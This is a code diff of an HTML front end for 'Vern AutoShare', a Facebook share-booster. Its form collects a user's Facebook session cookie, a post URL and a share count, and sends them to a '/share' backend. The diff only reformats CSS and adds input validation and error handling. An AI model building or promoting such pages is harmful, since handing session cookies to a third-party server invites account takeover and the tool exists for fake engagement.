@@ -5,40 +5,47 @@
     <title>Vern AutoShare</title>
     <style>
         body {
-       background: beige;
-       
-}
-  button {
-     background-color: #007bff;
-    color: white;
-  }
-        h1{
-           color: RGB(24, 119,242);
-            border: 10px;
+            background: beige;
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        h1 {
+            color: rgb(24, 119, 242);
             margin: 0;
         }
-          h2 {
-          color: violet;
-          font-size: 20px;
-       }
-          form {
-              font-size: 20px;
-              color: rebeccapurple;
-          }
-             p {
-                 color: brown;
-             }
-         li {
-           color: chocolate;
-         }
-        body { font-family: Arial, sans-serif; margin: 20px; }
-        form { max-width: 400px; margin: auto; }
-        input, button { width: 100%; padding: 8px; margin: 8px 0; }
+        h2 {
+            color: violet;
+            font-size: 20px;
+        }
+        form {
+            font-size: 20px;
+            color: rebeccapurple;
+            max-width: 400px;
+            margin: auto;
+        }
+        input, button {
+            width: 100%;
+            padding: 8px;
+            margin: 8px 0;
+        }
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            cursor: pointer;
+        }
+        p {
+            color: brown;
+        }
+        li {
+            color: chocolate;
+        }
     </style>
 </head>
 <body>
     <h1>Facebook Share by Vern</h1>
-  <h2>Creator: https://www.facebook.com/vern.23x</h2>
+    <h2>Creator: <a href="https://www.facebook.com/vern.23x" target="_blank">https://www.facebook.com/vern.23x</a></h2>
+
     <form id="shareForm" method="POST">
         <label for="cookie">Facebook Cookie:</label>
         <input type="text" id="cookie" name="cookie" required>
@@ -47,12 +54,21 @@
         <input type="text" id="url" name="url" required>
 
         <label for="limit">Share Limit:</label>
-        <input type="number" id="limit" name="limit" required>
+        <input type="number" id="limit" name="limit" required min="1">
 
         <button type="submit">Share Now</button>
     </form>
 
     <div id="result"></div>
+
+    <p>Important announcement from the creator!</p>
+    <ul>
+        <li>This site is not for sale!</li>
+        <li>Contact the owner if you have any questions</li>
+        <li>Expect delay while sharing</li>
+        <li>Be patient</li>
+        <li>Enjoy using this site!</li>
+    </ul>
 
     <script>
         document.getElementById("shareForm").onsubmit = async (event) => {
@@ -60,24 +76,24 @@
             const data = {
                 cookie: document.getElementById("cookie").value,
                 url: document.getElementById("url").value,
-                limit: document.getElementById("limit").value
+                limit: parseInt(document.getElementById("limit").value)
             };
-            const response = await fetch('/share', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
-            const result = await response.json();
-            document.getElementById("result").innerText = JSON.stringify(result, null, 2);
+
+            try {
+                const response = await fetch('/share', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+
+                if (!response.ok) throw new Error('Server returned an error.');
+
+                const result = await response.json();
+                document.getElementById("result").innerText = JSON.stringify(result, null, 2);
+            } catch (error) {
+                document.getElementById("result").innerText = 'Error: ' + error.message;
+            }
         };
     </script>
-  <p>Important announcement from the creator!</p>
-  <ul>
-    <li>This site is not for sale!</li>
-    <li>Contact the owner if you have any questions</li>
-    <li>Expect delay while sharing</li>
-    <li>Be patient</li>
-    <li>Enjoy using this site!</li>
-  </ul>
 </body>
 </html>
